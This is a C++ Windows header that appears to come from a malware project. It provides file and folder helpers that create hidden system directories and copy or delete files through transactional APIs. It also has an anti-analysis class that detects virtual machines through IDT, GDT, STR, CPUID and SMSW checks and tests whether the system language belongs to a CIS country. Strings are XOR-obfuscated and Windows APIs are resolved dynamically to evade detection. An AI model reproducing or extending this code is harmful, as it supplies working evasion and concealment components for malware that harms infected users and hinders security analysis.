#pragma once
#include <string>
#include <Windows.h>

#include "xor.h"
#include "DynImport.h"

using std::string;

#define XOR(x) XorStr(x)

class file
{
	class Directory
	{
	public:
		BOOL Exists(const string& dirName)
		{
			DWORD attribs = FNC(GetFileAttributesA, XorStr("Kernel32.dll"))(dirName.c_str());
			return attribs == INVALID_FILE_ATTRIBUTES ? false : (attribs & FILE_ATTRIBUTE_DIRECTORY);
		}

		void Create(const string& path)
		{
			LPWSTR desc = NULL;
			HANDLE hTrans = FNC(CreateTransaction, XorStr("KtmW32.dll"))(NULL, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, desc);
			if (hTrans != INVALID_HANDLE_VALUE)
			{
				if (FNC(CreateDirectoryTransactedA, XorStr("Kernel32.dll"))(NULL, path.c_str(), NULL, hTrans))
					FNC(CommitTransaction, XorStr("KtmW32.dll"))(hTrans);
				else
				{
					FNC(RollbackTransaction, XorStr("KtmW32.dll"))(hTrans);
					FNC(CreateDirectoryA, XorStr("Kernel32.dll"))(path.c_str(), NULL);
				}
			}

			FNC(SetFileAttributesA, XOR("Kernel32.dll"))(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY);
		}
	}Folder;

	class AntiVM
	{
		ULONG get_idt_base()
		{
			try
			{
				UCHAR idtr[6];
				ULONG idt = 0;

				__asm sidt idtr

				idt = *((unsigned long*)&idtr[2]);

				return idt;
			}
			catch (...) { return 0; }
		}

		ULONG get_gdt_base()
		{
			try
			{
				UCHAR gdtr[6];
				ULONG gdt = 0;

				_asm sgdt gdtr

				gdt = *((unsigned long *)&gdtr[2]);

				return gdt;
			}
			catch (...) { return 0; }
		}

		void __cpuid(int CPUInfo[4], int InfoType)
		{
			try
			{
				__asm
				{
					mov esi, CPUInfo
					mov eax, InfoType
					xor ecx, ecx
					cpuid
					mov dword ptr[esi + 0], eax
					mov dword ptr[esi + 4], ebx
					mov dword ptr[esi + 8], ecx
					mov dword ptr[esi + 12], edx
				}
			}
			catch (...) { return; }
		}
	public:
		bool IsVM()
		{
			try
			{
				UINT idt_base = get_idt_base();
				if ((idt_base >> XorInt(24)) == XorInt(0xFF))
					return true;
				UINT gdt_base = get_gdt_base();
				if ((gdt_base >> XorInt(24)) == XorInt(0xFF))
					return true;

				UCHAR mem[4] = { 0, 0, 0, 0 };
				__asm str mem
				if ((mem[0] == 0x00) && (mem[1] == 0x40))
					return true;
				
				int CPUInfo[4] = { -1 };
				__cpuid(CPUInfo, 1);
				if ((CPUInfo[2] >> XorInt(31)) & 1) // Detects hypervisor
					return true;

				unsigned int reax = 0;
				__asm
				{
					mov eax, 0xCCCCCCCC
					smsw eax
					mov [reax], eax
				}

				if ((((reax >> XorInt(24)) & XorInt(0xFF)) == XorInt(0xCC)) && (((reax >> XorInt(16)) & XorInt(0xFF)) == XorInt(0xCC)))
					return true;

				return false;
			}
			catch (...) { return false; }
		}

		bool isCis()
		{
			try
			{
				int result = (int)FNC(GetUserDefaultLangID, XOR("Kernel32.dll"))();
				if (result == XorInt(1049) ||
					result == XorInt(1067) ||
					result == XorInt(2092) ||
					result == XorInt(1068) ||
					result == XorInt(1059) ||
					result == XorInt(1079) ||
					result == XorInt(1087) ||
					result == XorInt(1064) ||
					result == XorInt(1090) ||
					result == XorInt(2115) ||
					result == XorInt(1091) ||
					result == XorInt(1058))
					return true;
				return false;
			}
			catch (...) { return false; }
		}
	} antiVM;

	void MakeFileNormal(const string& path)
	{
		try
		{
			FNC(SetFileAttributesA, XorStr("Kernel32.dll"))(path.c_str(), FILE_ATTRIBUTE_NORMAL);
		}
		catch (...) { return; }
	}
public:
	string ExePath()
	{
		try
		{
			char result[MAX_PATH];
			return string(result, FNC(GetModuleFileNameA, XorStr("Kernel32.dll"))(NULL, result, MAX_PATH));
		}
		catch (...) { return ""; }
	}

	void Delete(const string& path)
	{
		try
		{
			LPWSTR desc = NULL;
			HANDLE hTrans = FNC(CreateTransaction, XorStr("KtmW32.dll"))(NULL, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, desc);
			if (hTrans != INVALID_HANDLE_VALUE)
			{
				this->MakeFileNormal(path);
				if (FNC(DeleteFileTransactedA, XorStr("Kernel32.dll"))(path.c_str(), hTrans))
					FNC(CommitTransaction, XorStr("KtmW32.dll"))(hTrans);
				else
				{
					FNC(RollbackTransaction, XorStr("KtmW32.dll"))(hTrans);
					FNC(DeleteFileA, XorStr("Kernel32.dll"))(path.c_str());
				}
			}
		}
		catch (...) { return; }
	}

	void Copy(const string& src, const string& dest)
	{		
		try
		{
			LPWSTR desc = NULL;
			HANDLE hTrans = FNC(CreateTransaction, XorStr("KtmW32.dll"))(NULL, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, desc);
			if (hTrans != INVALID_HANDLE_VALUE)
			{
				this->MakeFileNormal(src);
				if (FNC(CopyFileTransactedA, XorStr("Kernel32.dll"))
					(src.c_str(), dest.c_str(), 0, 0, 0, COPY_FILE_OPEN_SOURCE_FOR_WRITE, hTrans))
					FNC(CommitTransaction, XorStr("KtmW32.dll"))(hTrans);
				else
				{
					FNC(RollbackTransaction, XorStr("KtmW32.dll"))(hTrans);
					FNC(CopyFileA, XorStr("Kernel32.dll"))(src.c_str(), dest.c_str(), FALSE);
				}
			}
		}
		catch (...) { return; }
	}

	bool Exists(const string& path)
	{
		try
		{
			return FNC(GetFileAttributesA, XOR("Kernel32.dll"))(path.c_str()) != INVALID_FILE_ATTRIBUTES;
		}
		catch (...) { return false; }
	}

	string getUserName()
	{
		try
		{
			if (getenv(XorStr("username")) != nullptr)
				return string(getenv(XorStr("username")));
			return XorStr("Unable to get");
		}
		catch (...) { return ""; }
	}

	AntiVM* antiVmInstance()
	{
		return &antiVM;
	}

	Directory* dirInstance()
	{
		return &Folder;
	}
};